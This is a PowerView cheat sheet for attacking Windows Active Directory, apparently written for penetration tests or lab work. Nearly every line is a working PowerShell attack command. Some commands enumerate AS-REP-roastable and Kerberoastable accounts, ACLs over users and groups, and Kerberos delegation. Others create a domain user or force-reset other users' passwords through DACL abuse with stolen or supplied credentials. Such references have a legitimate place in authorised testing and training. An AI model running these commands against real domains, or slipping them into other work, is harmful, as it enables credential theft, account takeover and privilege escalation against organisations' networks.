# powerview

% ad, windows, powerview
#plateform/windows #target/remote  #cat/RECON 

## user - new domain user
```
new-domainuser -SamAccountName jubeaz -AccountPassword $SecPassword -Domain client.offshore.com
```

## User - Get ASREPRoastable users
```powershell
Get-NetUser -PreauthNotRequired
```


## User - Get Kerberoastable users
```powershell
Get-NetUser -SPN
```

## User - Find all groups our current user got access
```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## User - Find all users our current user got access
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```


## User - Find user accounts that have kerberos constrained delegation 
```powershell
Get-NetUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
```


## User - Find user accounts that have kerberos unconstrained delegation 
```powershell
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```


## User - change user password (alternate cred)
#cat/ATTACK/DACL-ABUSE 
```
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain_netbios>\<user>', $SecPassword)
Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString '<new_password|Jubeaz12345+->' -AsPlainText -Force) -Credential $Cred -Domain <dst_domain_fqdn>
```

## User - change user password
#cat/ATTACK/DACL-ABUSE 
```
Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString '<new_password|Jubeaz12345+->' -AsPlainText -Force) -Domain <dst_domain_fqdn>
```